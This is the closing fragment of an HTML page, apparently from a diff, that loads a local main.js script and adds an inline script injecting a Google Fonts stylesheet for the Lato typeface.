integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
+<script>(function(){const e=document.createElement('link');e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
